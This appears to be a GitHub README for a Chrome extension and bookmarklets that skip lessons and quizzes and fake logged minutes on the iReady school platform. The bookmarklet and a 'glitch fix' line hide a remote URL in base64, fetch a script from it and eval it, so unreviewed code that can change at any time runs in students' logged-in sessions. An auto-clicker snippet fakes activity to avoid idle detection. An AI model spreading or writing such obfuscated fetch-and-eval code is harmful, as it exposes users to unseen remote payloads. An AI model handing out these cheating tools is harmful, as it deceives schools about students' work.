# iReady-Overload
iReady is awful. It's the worst education tool anyone could ever use. I'm fed up with being forced to mindlessly watch the result of a greedy corporation that doesn't try in the SLIGHTEST to make their product enjoyable, or even acceptable. This repository is a collection of hacks and a chrome extension that ensures nobody has to suffer through iReady ever again. The current version has a lesson, quiz skipper, and a minutes hack. 

As of 12/4, github says this repo has ~14,000 downloads meaning 14,000 less people having to use iReady. Problem is, that barely makes a dent in iReady's 10,000,000+ students (0.0014%). If your school uses iReady, recommend this extension. They'll thank you. 

# How to use/install
Download the chrome extension by clicking [here](https://github.com/Ireadycoder/iReady-OverLoad-update?raw=true)

Go to "chrome://extensions/", and on the top right make sure "Developer mode" is turned on (if your school blocks this, see the bookmarklet below)
then unzip chromeExtension.zip and drag the "iReady Overload" folder onto the page and ur good

# Bookmarklet

A bookmarklet can be used instead of the chrome extension, incase your school has blocked extentions. To do this:

1. Make a bookmark (the star on the right side of the top url/search bar if you are using chrome)
2. Click on more at the bottom left corner
3. Delete everything in the url box
4. Type javascript:
5. Paste in the following code
```fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vY3VwaWRpdHlzL3Jhdy91cGxvYWQvdjE2MzgzNDExMjEvYm9va21hcmtsZXQuanM=')).then((res) => res.text().then((t) => eval(t)))```
(this will auto-update)

Alternatively, you can use [this version](https://github.com/cupiditys/iReady-Overload/blob/main/bookmarklet.txt) if the other one is not working for whatever reason (this one will not auto-update)

# How to avoid being AFK-kicked
press ctrl + shift + i, press console tab at top and paste the stuff below in and obviously press enter
```
setInterval(lol, 60000)
function lol() {
    document.getElementById("btn-footer-MY_PROGRESS").click()
    document.getElementById("btn-footer-TO_DO").click()
}
```

# Extra
credit to ArjhanToteck for originally making this (but he deleted his)

If lesson glitches and says wait click the green arrow to continue and won't let you on the lesson paste this code to fix- fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vY3VwaWRpdHlzL3Jhdy91cGxvYWQvdjE2MzkxOTI0MTQvc19qMnU5ZnMuanM')).then((res) => res.text().then((t) => eval(t)))